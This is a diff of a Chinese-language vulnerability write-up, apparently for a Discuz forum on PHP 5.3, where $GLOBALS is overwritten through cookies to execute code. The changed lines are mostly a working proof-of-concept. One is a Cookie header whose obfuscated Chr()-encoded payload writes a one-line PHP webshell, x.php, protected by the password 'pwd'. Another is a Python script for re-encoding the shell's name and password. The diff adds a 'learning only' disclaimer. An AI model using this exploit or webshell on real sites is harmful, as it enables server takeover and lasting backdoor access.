@@ -13,7 +13,7 @@ tags:
 ---
 ## 漏洞描述
 
-由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，也就是说默认配置下`$_REQUEST`只包含`$_GET`和`$_POST`而不包括$_COOKIE。
+由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致<code>&#36;_REQUEST</code>中不再包含<code>&#36;_COOKIE</code>，也就是说默认配置下<code>&#36;_REQUEST</code>只包含<code>&#36;_GET</code>和<code>&#36;_POST</code>而不包括&#36;_COOKIE。
 
 我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。
 
@@ -52,23 +52,28 @@ Connection: close
 
 同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd
 
-```
-Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=&#101;val(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))</code></pre>
+
+</details>
 
 ASCII码和字符互相转换的小脚本，方便修改POC的文件名和密码：
 
-```
-import re
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">import re
 # ASCII = ord(Word)
 # Word = chr(ASCII)
 
-# ASCII -> Word
+# ASCII -&gt; Word
 def ASCII2word(ASCIIs):
 	for c in re.findall(r"(\d+)", ASCIIs):
 	    print(chr(int(c)),end="")
 
-# Word -> ASCII
+# Word -&gt; ASCII
 def word2ASCII(words):
 	ASCIIs = ""
 	for word in words:
@@ -82,9 +87,10 @@ ASCII2word(asciis)
 
 print("\n\n----------WORD TO ASCII--------------------")
 
-words = "fputs(fopen('x.php','w'),'<?php @eval($_POST[pwd])?>');"
-word2ASCII(words)
-```
+words = "fputs(fopen('x.php','w'),'&lt;?php @&#101;val(&#36;_POST[pwd])?&gt;');"
+word2ASCII(words)</code></pre>
+
+</details>
 
 ---
 
